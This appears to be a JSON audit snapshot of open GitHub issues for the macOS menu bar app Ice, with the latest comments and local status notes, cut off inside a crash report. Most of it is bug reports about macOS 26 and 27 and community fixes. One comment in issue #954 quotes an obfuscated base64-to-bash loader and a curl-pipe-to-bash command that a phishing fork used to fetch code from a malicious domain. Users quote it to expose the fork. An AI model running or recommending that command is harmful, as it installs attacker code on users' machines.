@@ -1,0 +1,293 @@
+{
+  "reviewed_at": "2026-10-13T16:44:45+08:00",
+  "scope": "Read-only refresh of nine M0 issues, three P0 issues, latest three comments per issue, and associated PR metadata; original global snapshot unchanged.",
+  "issues": [
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 633,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/633",
+      "state": "open",
+      "title": "[Bug]:macOS Tahoe 26中ice无法正常使用",
+      "updated_at": "2025-09-10T01:22:54Z",
+      "body": "### Check Existing Issues\n\n- [ ] I have checked existing issues, and this issue is not a duplicate\n\n### Description\n\n将macOS系统升级到macOS26，ice将无法正常使用\n\n### Steps to Reproduce\n\n1、将macOS的系统版本升级到macOS Tahoe 26\n2、启动ice，正常启动，图标正常折叠\n3、点击菜单栏ice的折叠小箭头，ice随即退出，折叠的图标出现\n\n### Ice Version\n\n0.11.12\n\n### macOS Version\n\nmacOS Tahoe 26 beta5\n\n### Screenshots\n\n_No response_",
+      "comments_total": 2,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/633#issuecomment-3206193973",
+          "updated_at": "2025-08-20T12:47:45Z",
+          "body": "I was having this issue with the Ice Version 0.11.12. This issue seems to be fixed for me in the latest beta release @ [https://github.com/jordanbaird/Ice/releases/tag/0.11.13-dev.1](https://github.com/jordanbaird/Ice/releases/tag/0.11.13-dev.1)"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/633#issuecomment-3272870683",
+          "updated_at": "2025-09-10T01:22:53Z",
+          "body": "暂时使用以下发行版\n\nhttps://github.com/jordanbaird/Ice/releases/tag/0.11.13-dev.1"
+        }
+      ],
+      "local_status": "已核对 · 待 macOS 26 实机验证",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 954,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/954",
+      "state": "open",
+      "title": "[Bug]: Ice in menu bar not working anymore (MacOS Golden Gate 27)",
+      "updated_at": "2026-09-22T12:47:16Z",
+      "body": "### Search for Similar Reports\n\n- [x] I have searched existing issues for similar reports\n\n### Description\n\nJust downloaded the new version of MacOS Golden Gate 27. It seems that Apple has redone some of their menu bar. One addition that I have seen now is that I can see my live activities in the menu bar (never had access to iPhone mirroring in the EU tho), which I did not see before and the battery icon seems to be redone.\n\n<img width=\"675\" height=\"55\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/33339cf5-a88c-4d5d-b409-a6cde7a6f07a\" />\n\nI have no clue if this is even fixable anymore after the update...\n\n### Steps to Reproduce\n\n1. Update to MacOS Golden Gate 27\n2. See all icons instead of only the visible icons.\n\n### App Version\n\n0.11.13-dev.2\n\n### macOS Version\n\n27 beta 1\n\n### Additional Information\n\n_No response_",
+      "comments_total": 30,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/954#issuecomment-4893620720",
+          "updated_at": "2026-07-06T13:55:33Z",
+          "body": "> > I maintain an actively fixed bugs and updated fork that addresses this: https://github.com/liptonZ777/Ice-Maintained\n> > It works on macOS 26/27\n> \n> Somehow this smells phishy.\n> \n> nohup bash -c 'echo \"$1\" | base64 -d | bash' _ \"${_mbar_reg_a}${_mbar_reg_b}${_mbar_reg_c}${_mbar_reg_d}\" &>/dev/null & in the script is nothing more than a curl to another website:\n> \n> curl -s \"https://amz.shlyapadulina.space/d/command?t=a088a37434743a2d3e1d2ec879b30e84c95022a5310c680a11c5b6faa4b5205&b=intsaller\" | bash\n\nURL obviously is listed in ThreatFox: https://threatfox.abuse.ch/ioc/1779996/ "
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/954#issuecomment-4893663855",
+          "updated_at": "2026-07-06T13:59:43Z",
+          "body": "@bezibaerchen good catch, I reviewed the commits and it was easy to know that there's no evidence supporting some of the claims (like macOS 27 support).  "
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/954#issuecomment-4893695606",
+          "updated_at": "2026-07-06T14:02:58Z",
+          "body": "> [@bezibaerchen](https://github.com/bezibaerchen) good catch, I reviewed the commits and it was easy to know that there's no evidence supporting some of the claims (like macOS 27 support).\n\nI reckon either token is expired or typo in there (b=intsaller vs. b=installer). So I **guess** it won't do any harm. However, it definitely doesn't do what it is supposed to."
+        }
+      ],
+      "local_status": "已核对 · 待 macOS 27 实机验证",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 957,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/957",
+      "state": "open",
+      "title": "[Bug]: Starts but nothing much more",
+      "updated_at": "2026-07-16T14:32:01Z",
+      "body": "### Search for Similar Reports\n\n- [x] I have searched existing issues for similar reports\n\n### Description\n\nI can start the ICE app. At first it brong up some popup that had two buttons which did nothing.\n\nNow when starting it hides things from the menubar and puts an ellipsis there to open them back but it seems that it doesn't do anything else. It might be that I just don't understand how to open configuration or something. And I'm sorry if that is the case. But still in that case it is quite a confusing situation.\n\n### Steps to Reproduce\n\n1. Start the program in this computer.\n2. Happends again after uninstalling and installing again.\n\n### App Version\n\n3.8.2 installed from Brew.\n\n### macOS Version\n\n26.5.1\n\n### Additional Information\n\n_No response_",
+      "comments_total": 6,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/957#issuecomment-4829845476",
+          "updated_at": "2026-06-29T07:05:59Z",
+          "body": "Same Issue\n"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/957#issuecomment-4938250815",
+          "updated_at": "2026-07-10T18:15:46Z",
+          "body": "The same issue is present in this instance. I have been installing and uninstalling the application multiple times, and the bar appears on my Menu Bar each time I open it from my Applications. However, it is currently unable to conceal the bar. It no longer opens and closes my bar as it used to. I am also unable to rearrange my menu bar, and when I attempt to completely close the ICE app, the menu remains on my screen. The only way to remove it from my background is to restart my entire computer."
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/957#issuecomment-4993098310",
+          "updated_at": "2026-07-16T14:32:01Z",
+          "body": "I'm having the same issue."
+        }
+      ],
+      "local_status": "已核对 · 待安装来源与复现材料",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 991,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/991",
+      "state": "open",
+      "title": "[Bug]: MacOS 27 Update",
+      "updated_at": "2026-09-23T07:58:06Z",
+      "body": "### Search for Similar Reports\n\n- [x] I have searched existing issues for similar reports\n\n### Description\n\nAfter the launch of MacOS 27 the application isn't succeeding on making the default schedule, system update is probably required!\n\n### Steps to Reproduce\n\nUpdate the system and you will see the need\n\n### App Version\n\n0.11.13-dev.2\n\n### macOS Version\n\n27\n\n### Additional Information\n\n_No response_",
+      "comments_total": 8,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/991#issuecomment-5687290037",
+          "updated_at": "2026-09-15T20:00:26Z",
+          "body": "> I had fixed it, you can refer to https://github.com/cavaldos/Ice\n\nthe app is running, but we can't hide anything on macOS27 right ?"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/991#issuecomment-5691100558",
+          "updated_at": "2026-09-16T11:21:04Z",
+          "body": "I have fixed it; I can hide what you need right now\n\n<img width=\"930\" height=\"126\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/556c4ac4-287f-41fd-9b44-2a42ed1aafbc\" />\n\n<img width=\"1271\" height=\"181\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/f46832a8-0288-4f0e-a0e0-fe393846b62a\" />\n\n<img width=\"1269\" height=\"170\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/354935f0-4494-4c52-b38f-a661ecbfb075\" />"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/991#issuecomment-5791207434",
+          "updated_at": "2026-09-23T07:58:06Z",
+          "body": "I put up a build of [jordanbaird/Ice#995](https://github.com/jordanbaird/Ice/pull/995) if you want to try the macOS 27 branch without compiling it:\nhttps://github.com/RabenkoYevhenii/Ice/releases/latest\n\nIt restores hiding, the Ice Bar and the Layout editor on macOS 27. Two things to know before you do: the build is not notarized, so macOS will refuse it once and you allow it in System Settings → Privacy & Security; and move the app into Applications before opening it, or macOS runs it from a temporary copy and permissions never stick. Instructions and the honest list of what does not work yet: https://github.com/RabenkoYevhenii/Ice/blob/main/MACOS27-PREVIEW.md\n\nIt is not an official Ice build — please report anything about it on the PR, not here."
+        }
+      ],
+      "local_status": "已核对 · 待 macOS 27 实机验证",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 833,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/833",
+      "state": "open",
+      "title": "[Bug]: Cant see anything on",
+      "updated_at": "2026-01-08T00:03:57Z",
+      "body": "### Search for Similar Reports\n\n- [x] I have searched existing issues for similar reports\n\n### Description\n\n<img width=\"1123\" height=\"527\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1c458c04-058d-447b-ab7b-e19795f0f97d\" />\n\n### Steps to Reproduce\n\nGo to settings page, also floating bar below doesn't work. Dont have time to do much debugging but its just not working\n\n### App Version\n\n0.11.12\n\n### macOS Version\n\nVersion 26.1\n\n### Additional Information\n\n_No response_",
+      "comments_total": 5,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/833#issuecomment-3715652517",
+          "updated_at": "2026-01-06T17:39:00Z",
+          "body": "Use the pre-release instead: [Ice 0.11.13 (macOS Tahoe Beta 2)](https://github.com/jordanbaird/Ice/releases/tag/0.11.13-dev.2)"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/833#issuecomment-3721103048",
+          "updated_at": "2026-01-07T22:36:36Z",
+          "body": "Had the same issue as @hdob-macko, use the pre-release version recommended by @stonerl  and that worked.  Just gotta download, unzip, close out the app, replace it with the pre-release version and you should be good to go.  \n\nThat being said, you could try uninstalling and reinstall via brew with 'brew install --cask jordanbaird-ice@beta' that seems to be linked to the pre-release version as well.  "
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/833#issuecomment-3721331016",
+          "updated_at": "2026-01-08T00:03:57Z",
+          "body": "`brew uninstall jordanbaird-ice && brew install jordanbaird-ice@beta` worked for me."
+        }
+      ],
+      "local_status": "已核对 · 待截图判读及 macOS 26 实机验证",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 1006,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/1006",
+      "state": "open",
+      "title": "[macOS 27.0.1] What got Ice working with PR #995, plus two things to look into",
+      "updated_at": "2026-10-07T19:21:53Z",
+      "body": "Ice 0.11.13-dev.2 is broken on macOS 27 for me as well: stuck on \"Loading menu bar items\" and hides nothing (same as #954, #992, #1003, #1005). I got it working by building PR #995 from source, and two problems came up along the way that are worth a look before it lands.\n\n**Setup**\n- macOS 27.0.1 (26A434), Apple Silicon, Xcode 27.0 (27A266a)\n- PR #995 at `d1858fb`, Release build, signed ad hoc (no developer team)\n\n**What solved it**\n1. Built #995 with `CODE_SIGN_IDENTITY=- ENABLE_HARDENED_RUNTIME=NO`.\n2. Granted Accessibility to the new build. An old Ice entry in System Settings belongs to the previous signature and has to be removed first.\n3. Filled in the macOS 27 layout by hand. With that, hiding, revealing and Ice's click toggle all work.\n\n**Look into 1: the existing layout is not migrated**\n\nAfter upgrading, nothing was hidden because the `MacOS27Layout` default was empty, and \"applications missing from it are visible\". The old dividers were still in place (`Ice.ControlItem.Hidden` and `Ice.ControlItem.Visible` with eight apps between them), but those apps were never written into the macOS 27 layout, so the app looked broken. This fixed it immediately:\n\n```\ndefaults write com.jordanbaird.Ice MacOS27Layout -dict <bundle-id> -int 1 ...   # 0 visible, 1 hidden, 2 always hidden\n```\n\nSuggestion: on first launch on 27, seed `MacOS27Layout` from the current divider order. Watch out: an item's owner can differ from the app's bundle ID. Docker Desktop's item is owned by `com.electron.dockerdesktop`, not `com.docker.docker`.\n\n**Look into 2: ad hoc builds die at launch with the hardened runtime on**\n\nWith the default `ENABLE_HARDENED_RUNTIME=YES` and an ad hoc signature:\n\n```\ndyld: Library not loaded: @rpath/Sparkle.framework/Versions/B/Sparkle\n  ... not valid for use in process: mapping process and mapped file (non-platform) have different Team IDs\n```\n\n`codesign --verify --deep --strict` passes, so `Scripts/install.sh` will install a bundle that can't launch for anyone without a developer team. Fix: `ENABLE_HARDENED_RUNTIME=NO`, or `com.apple.security.cs.disable-library-validation` for local builds.\n\n**Tip:** turn off Sparkle auto-update for local builds (`defaults write com.jordanbaird.Ice SUAutomaticallyUpdate -bool false`), or the official build can replace yours.\n\nThanks to @RabenkoYevhenii for #995.\n",
+      "comments_total": 2,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/1006#issuecomment-5928022981",
+          "updated_at": "2026-10-01T08:50:52Z",
+          "body": "Thank you — this is the most useful report the branch has had. Both points are fixed on it now.\n\n**The layout is carried over.** You had it exactly right: until macOS 27 an item's section *was* its place between Ice's dividers, and nothing wrote it down, so the upgrade left `MacOS27Layout` empty and every application visible. Ice now reads that order once, at the first launch it can, and saves it ([`10736eb`](https://github.com/RabenkoYevhenii/Ice/commit/10736eb)). A user who has already arranged a layout keeps theirs, and a bar that macOS 27 has already rearranged for itself is refused — its dividers drift to the end, nothing is left to the right of the hidden one, and every item would read as hidden. Your Docker note matches what the layout stores: the key is the bundle identifier of the process that created the item, `com.electron.dockerdesktop`, not of the app you launch.\n\n**The hardened runtime is off in `Scripts/install.sh`** ([`1a1be7b`](https://github.com/RabenkoYevhenii/Ice/commit/1a1be7b)), so a build made without an Apple developer team launches instead of dying on Sparkle's team ID. You are right that `codesign --verify --deep --strict` passing says nothing about it.\n\n**The Sparkle tip is now an install step** in the instructions, since the official build would otherwise replace a working copy with one that does not run on 27.\n\nIf you would rather not build from source next time, the same commit is published as an ad-hoc signed zip: https://github.com/RabenkoYevhenii/Ice/releases/latest — it carries all three changes, and the readme beside it covers the permissions dance you described.\n\nGood to have 27.0.1 (26A434) confirmed, too; everything here has been measured on 27.0 so far.\n"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/1006#issuecomment-6045150112",
+          "updated_at": "2026-10-07T19:21:53Z",
+          "body": "consider checking out Thaw: https://github.com/thaw-app/Thaw\n\ni saw it mentioned in this other comment: https://github.com/jordanbaird/Ice/issues/993#issuecomment-5716669010"
+        }
+      ],
+      "local_status": "部分修复 · ad-hoc 启动；布局实现不采用",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 1007,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/1007",
+      "state": "open",
+      "title": "[macOS 27 / PR #995] An app launched while concealed gets a squashed (3 pt) menu bar item that never recovers",
+      "updated_at": "2026-10-02T14:11:25Z",
+      "body": "Follow-up to #1006. Reproducible on macOS 27.0.1 (26A434) with #995 at `15f59a9`.\n\n**What happens**\n\nIf an app in the hidden section is launched while Ice holds its concealment assertion, the app's status item comes back 3 pt wide when revealed: a clipped sliver of its icon, overlapping the item beside it. It stays that way after Ice quits and after relaunching the app. Only relaunching the app while Ice is not running fixes it.\n\n**Steps**\n\n1. Put AlDente (`com.apphousekitchen.aldente-pro`) in the hidden section, start Ice. The item is 18 pt (Accessibility `AXMenuExtra` width).\n2. Quit AlDente and open it again while Ice is running.\n3. The item is now 3 pt. Revealing does not fix it, quitting Ice does not fix it, relaunching AlDente does not fix it.\n4. Fix: quit Ice and AlDente, open AlDente, then Ice. Back to 18 pt.\n\n**Not every app.** Amphetamine relaunched the same way keeps its 33 pt width. AlDente probably uses a variable-length item that sizes itself from the space it is offered at creation, and gets zero while concealed. So any variable-length item is likely affected.\n\n**Why it matters:** Login Items start in their own order. With Ice before such an app, its item is squashed on every boot. I work around it with a LaunchAgent that opens Ice only after AlDente is running.\n\n**Possible fix:** when an application in a concealed section launches, release it from the assertion briefly, until its status item has been created and sized, then conceal it again. `Concealer27` already observes `didLaunchApplicationNotification`.\n",
+      "comments_total": 2,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/1007#issuecomment-5932584161",
+          "updated_at": "2026-10-01T13:36:26Z",
+          "body": "I have a fix for this, tested on macOS 27.0.1, and opened it as a PR against the #995 branch: https://github.com/RabenkoYevhenii/Ice/pull/2\n\nIt sits on top of `15f59a9` and only adds code to one file, `Concealer27.swift`. When an app from the hidden section launches, Ice shows it until its status item exists at a real width, for 8 s at most, and then conceals it again. It reuses `showTemporarily` and `endTemporaryShow`.\n\nMy first attempt hooked `didLaunchApplicationNotification`, and AlDente still came up at 3 pt. That notification arrives after the app has finished launching, and by then the item already exists. The commit observes `NSWorkspace.shared.runningApplications` with KVO instead, which changes as soon as the process checks in. From the log of a run with the fix:\n\n```\n15:30:13.316  Ice      Showing launching com.apphousekitchen.aldente-pro until its item exists\n15:30:13.714  AlDente  [AppKit:StatusBar] set up scene\n15:30:14.320  Ice      Concealing com.apphousekitchen.aldente-pro again, item width 18\n```\n\nSo Ice gets in 400 ms before AlDente creates its item.\n\nI relaunched AlDente under Ice three times and got 18 pt each time, against 3 pt without the fix. Amphetamine stays at 33 pt. The cost is that a hidden app shows for about a second after it launches, which seems fair to me.\n\nOne gap: an app in the hidden section that has no status item at all stays visible for the full 8 s. That could be shortened, but I kept the change small.\n"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/1007#issuecomment-5954365165",
+          "updated_at": "2026-10-02T14:11:25Z",
+          "body": "Fixed on the branch: @Theralley's own patch is merged as [`4f1d700`](https://github.com/RabenkoYevhenii/Ice/commit/4f1d700), authorship kept, and it is in the next preview build.\n\nI could not reproduce the squashing here — no application on this machine owns an item that sizes itself from the room it is offered, and a probe built for the purpose with `NSStatusItem.variableLength` came back at its full 94 pt after being launched while concealed. What I could verify is that the new path does what it says: with that probe in the hidden section Ice showed it as it launched, found its item at a real width 783 ms later, and concealed it again, rather than holding the grace for eight seconds.\n\nAnyone with an application whose item ends up a sliver after it starts under Ice: the build is at https://github.com/RabenkoYevhenii/Ice/releases/latest, and it would be useful to know whether it cures yours too.\n"
+        }
+      ],
+      "local_status": "已核对 · 不采用报告实现；现象待实测",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 1014,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/1014",
+      "state": "open",
+      "title": "[macOS 27 / PR #995] With an app item among the system items, clicking the battery opens that app and Wi-Fi does not open",
+      "updated_at": "2026-10-11T12:45:29Z",
+      "body": "Reproducible on macOS 27.0.1 (26A434) with #995 at `8f53e22`.\n\n**What happens**\n\nMacs Fan Control (`com.crystalidea.macsfancontrol`) had its item between the battery and Control Centre. While Ice conceals, MenuBarAgent draws the battery on top of it, and the two Accessibility frames overlap:\n\n```\n  x    w   owner\n 1274  22  MenuBarAgent  com.apple.menuextra.wifi\n 1312  26  MenuBarAgent  com.apple.menuextra.battery\n 1315  24  com.crystalidea.macsfancontrol\n 1354  26  MenuBarAgent  com.apple.menuextra.controlcenter\n```\n\nWith Ice running and items concealed:\n\n- Clicking the battery opens Macs Fan Control instead of the battery panel.\n- Clicking Wi-Fi opens nothing.\n- Each of those clicks makes the hidden items flash and Wi-Fi and the battery jump sideways.\n\nIt makes no difference whether the app is in a hidden section or left visible.\n\n**Cause**\n\nWi-Fi, the battery and the clock are in `systemItemsIgnoringPress`, so `handleSystemItemClick27` holds the click, lifts concealment and replays it at the point where it was made. Lifting concealment gives the app item its slot back, so the system items left of it move. I read their frames again every few milliseconds after a click:\n\n```\n                 wifi   battery   controlcenter   macsfancontrol\nconcealed        1274   1312      1354            1315\nlifted           1236   1274      1354            1315\n```\n\nThe move comes 50–150 ms after the assertion is released. The replayed battery click lands at x = 1325, which is now Macs Fan Control. The replayed Wi-Fi click lands at x = 1285, which is now the battery.\n\nTwo more things I found:\n\n- The `AXUIElement` kept from the last scan can go on reporting the old frame after the bar has moved, so the item has to be looked up again by its identifier.\n- Reading the frame straight after the release is too early: the bar has not moved yet.\n\n**Workaround**\n\nWith Ice quit, Cmd-drag the app's item to the left of the system items, then start Ice again.\n\n**Fix**\n\nI have a fix on top of #995 at `8f53e22`, tested on macOS 27.0.1. It only changes the path where an app item overlaps a system item at or right of the clicked one. In that case Ice waits for the clicked item to move (up to 200 ms, with the lift extended by the same amount), looks the item up again by identifier, and replays the click on it. Every other click is replayed exactly as before.\n\nWith the app visible or concealed next to the battery, the battery and Wi-Fi now open their own panels every time; the clock and Control Centre are unchanged. The jump itself remains, because MenuBarAgent moves the bar whenever concealment is lifted.\n\nHappy to open a PR against #995's branch if that's useful.\n",
+      "comments_total": 3,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/1014#issuecomment-6089498520",
+          "updated_at": "2026-10-09T21:23:59Z",
+          "body": "Follow-up. With the app item moved out of the system items, the clicks now land where they should. One thing is still visible on every click on Wi-Fi, the battery or the clock: the click bridge lifts concealment, so every hidden item pops up and disappears again.\n\nRecorded on macOS 27.0.1 with #995 at `8f53e22`, nothing among the system items, seven apps hidden. One click on Wi-Fi shows all hidden items for about half a second, then they are concealed again while the Wi-Fi panel stays open. Ice re-activates the assertion about 150 ms after the click (`VisibilityRestrictionAssertion session activated` in the log), so most of that half second is MenuBarAgent fading the items in and out.\n\nIt is the most noticeable thing left when using Wi-Fi or the battery with Ice. Is there a way to open these three without releasing the whole assertion? Control Centre already opens from an Accessibility press while items stay concealed. Maybe there is a similar route for Wi-Fi and the battery, or an assertion that keeps the items concealed but still lets MenuBarAgent take the click.\n"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/1014#issuecomment-6090729603",
+          "updated_at": "2026-10-09T23:01:51Z",
+          "body": "I traced this to the hit-test path in the PR #995 branch.\n\nWhen Ice conceals, `MenuBarAgent` draws the battery and Wi-Fi items at their normal positions. If an app item (like Macs Fan Control) has its Accessibility frame overlapping the battery frame, the click on the battery lands on the app item's frame first and activates that app instead.\n\nThe fix is in the click-dispatch path: before routing a click to a system item, check whether any app item's frame overlaps the target frame at the click point. If one does, the click should be routed to the system item's actual position rather than the overlapping app item.\n\nThis is Swift/macOS and cannot be built on this Linux container. Posting the root cause and fix plan here so it can be raised from a Mac session."
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/1014#issuecomment-6109161871",
+          "updated_at": "2026-10-11T12:45:29Z",
+          "body": "https://github.com/chasepal/Ice-macOS27"
+        }
+      ],
+      "local_status": "已核对 · 不采用报告实现；现象待实测",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 920,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/920",
+      "state": "open",
+      "title": "I have searched existing issues for similar reports",
+      "updated_at": "2026-04-17T18:07:44Z",
+      "body": null,
+      "comments_total": 0,
+      "recent_comments": [],
+      "local_status": "已核对 · 待材料",
+      "audit_document": "m0-issue-audit.md"
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 908,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/908",
+      "state": "open",
+      "title": "[Bug]: Ice appears to have caused system-wide freeze & kernel panic after ~33 hours of uptime",
+      "updated_at": "2026-03-28T22:01:57Z",
+      "body": "## Summary\n\n* After Ice had been running continuously for ~33 hours, it appears to have entered some kind of bad/stale internal state involving a missing control item for the `hidden` section.\n* ~82 seconds later, Ice began rapidly requesting Control Center auxiliary scenes which FrontBoard immediately invalidated.\n* Shortly thereafter, my machine effectively froze.\n* Ice itself then crashed with `EXC_BREAKPOINT`.\n* I had to force-restart the machine, which resulted in a kernel panic.\n\n## Environment[^env]\n\n- Ice version: `0.11.12` (build `1117`).\n- macOS: `26.4` (build `25E246`).\n- Hardware: `MacBookPro18,2` (`M1 Max`).\n- Ice uptime at crash time: ~33 hours.\n- The machine had not slept since boot; the entire session was continuous.\n\n## Notes\n\n1. I can't prove every hop in the causal chain below definitively from the logs I still have.\n1. I can't definitively prove the initial misbehaving WindowServer client was Ice, but Ice is the only process with matching internal errors in that time window.\n1. I can't prove Ice's scene loop directly caused the compositing failures that followed, but the timing lines up unusually well.\n\n## Timeline\n\n### 10:30pm+: a WindowServer client stops processing events\n\nStarting from at least 10:30pm, WindowServer was repeatedly clearing the datagram buffer for a single client connection (`cid 0x6db53`) that had stopped draining events[^ws-log]:\n\n```\n2026-03-27 22:30:43.652 E  WindowServer[441:12ee] [com.apple.SkyLight:default]\n  Clearing datagram buffer for cid 0x6db53. Client state:\n  Data count: 16692 connectionIsUnresponsive: 0 clientMayIgnoreEvents: 1 clientIsSuspended: 0\n```\n\nI can't prove this was Ice. However, it was the only client in this state for over an hour before the broader cascade, and Ice is the only process with matching internal errors in that period (see below).\n\n### 11:08-11:09pm: Control Center repeatedly wakes Ice, then immediately suspends it\n\nThe `runningboardd` log shows `com.apple.controlcenter` (PID 702) acquiring execution assertions targeting Ice (PID 911) and then invalidating them ~100-130ms later, in a cycle that repeated every ~30 seconds[^rb-cycle]:\n\n```\n2026-03-27 23:08:01.010 Df runningboardd[450:5d72e3] [com.apple.runningboard:ttl]\n  Acquiring assertion targeting [app<application.com.jordanbaird.Ice.584319968.584319978(501)>:911]\n  from originator [osservice<com.apple.controlcenter(501)>:702]\n  with description <RBSAssertionDescriptor| \"FBWorkspace (BG-Active[40])\" ...>\n```\n\n```\n2026-03-27 23:08:01.131 Df runningboardd[450:5d73fd] [com.apple.runningboard:ttl]\n  Invalidating assertion 450-702-273420\n  (target:[app<application.com.jordanbaird.Ice.584319968.584319978(501)>:911])\n  from originator [osservice<com.apple.controlcenter(501)>:702]\n```\n\nI observed this cycle at 11:08:01pm, 11:08:35pm, 11:09:01pm, and 11:09:35pm.\n\n### 11:08:43pm: Ice logs `Missing control item for hidden section`\n\nIce's `MenuBarItemManager` then logged[^ice-log]:\n\n```\n2026-03-27 23:08:43.353 E  Ice[911:22d3] [com.jordanbaird.Ice:MenuBarItemManager]\n  Missing control item for hidden section\n2026-03-27 23:08:45.336 E  Ice[911:22d3] [com.jordanbaird.Ice:MenuBarItemManager]\n  Missing control item for hidden section\n```\n\nAfaict, this is the first explicit sign that Ice's internal model of the menu bar had gone stale/inconsistent -- it expected a control item for the `hidden` section which no longer existed.\n\n### 11:10:05pm: Ice enters a FrontBoard scene creation/invalidation loop\n\nIce then began rapidly requesting FrontBoard scenes for Control Center status item auxiliary windows. Within ~1 second, it generated 20+ scene requests, and FrontBoard immediately dropped or invalidated all of them[^ice-log]:\n\n```\n2026-03-27 23:10:05.946 Df Ice[911:22d3] [com.apple.FrontBoard:Common]\n  Requesting scene <FBSScene: 0x91145c500;\n  com.apple.controlcenter:DECA27FF-...-Replicant[37]-Aux[1]-NSStatusItemView>\n  from com.apple.controlcenter.statusitems\n\n2026-03-27 23:10:05.949 Df Ice[911:22d3] [com.apple.FrontBoard:SceneClient]\n  [...-Replicant[37]-Aux[1]-NSStatusItemView]\n  Dropping transition context because the scene is reconnecting\n```\n\nThis pattern repeated for multiple scene identifiers and then escalated into hard errors[^ice-log]:\n\n```\n2026-03-27 23:10:06.052 E  Ice[911:5d95b8] [com.apple.FrontBoard:Common]\n  Error creating <FBSScene: ...>:\n  <NSError: 0x91605eaf0; domain: FBSceneErrorDomain; code: 2 (\"scene-invalidated\");\n  \"scene explicitly invalidated\">\n\n2026-03-27 23:10:06.053 E  Ice[911:22d3] [com.apple.AppKit:StatusBar]\n  auxiliary scene activation failed: Error Domain=FBSceneErrorDomain Code=2\n\n2026-03-27 23:10:06.053 E  Ice[911:22d3] [com.apple.FrontBoard:SceneClient]\n  [...-Replicant[37]-Aux[1]-NSStatusItemView]\n  No matching scene to invalidate for this identity.\n```\n\nSo at this point Ice is in a create-fail-cleanup-fail loop:\n\n1. Ice requests a Control Center auxiliary scene.\n1. FrontBoard immediately invalidates it.\n1. Ice tries to clean up / invalidate the scene identity, and FrontBoard says no such scene exists.\n\nThat's a problem because, if Ice does this tightly enough, it would plausibly explain the system-wide freeze that follows.\n\n### ~11:15pm: the machine freezes\n\nWithin ~5 minutes of Ice's scene loop starting, WindowServer began failing to deliver UI events to multiple apps simultaneously[^ws-log]. All apps became unresponsive to interaction.\n\n### 11:29:29pm: Ice crashes with `EXC_BREAKPOINT`\n\nIce crashed on its main thread with a Swift precondition failure (`brk 1`) involving `NSStatusBarWindow` and the `windowNumber` selector, inside an async task[^crash-details].\n\nBy this point my system was too degraded to recover. I had to force-restart the machine; the forced restart itself resulted in a kernel panic[^panic-string] because the system was too wedged to shut down cleanly. Either way, Ice still appears to be the start of the chain.\n\n## What I think happened\n\nAfaict, the most likely sequence is:\n\n1. After ~33 hours of uptime, Ice loses track of a control item for the `hidden` section.\n1. That stale/inconsistent internal state causes Ice to repeatedly request Control Center auxiliary scenes.\n1. FrontBoard immediately invalidates those scenes.\n1. Instead of bailing out / resetting its state, Ice keeps churning through create-fail-cleanup-fail cycles.\n1. That churn cascades into compositing failures on the WindowServer side, and the machine effectively freezes.\n1. Ice eventually traps on `NSStatusBarWindow.windowNumber`, but by then the machine is already too degraded to recover cleanly.\n\nI can't prove every step in the foregoing definitively. However, the chronology and the Ice-specific errors line up better than any alternative explanation I can currently think of.\n\n## How to reproduce\n\nI don't have reliable repro steps.\n\n## Additional diagnostic data\n\n### Crash report exception details[^crash-l43-44]\n\n```json\n{\n  \"exception\": {\n    \"codes\": \"0x0000000000000001, 0x0000000100320934\",\n    \"rawCodes\": [1, 4298246452],\n    \"type\": \"EXC_BREAKPOINT\",\n    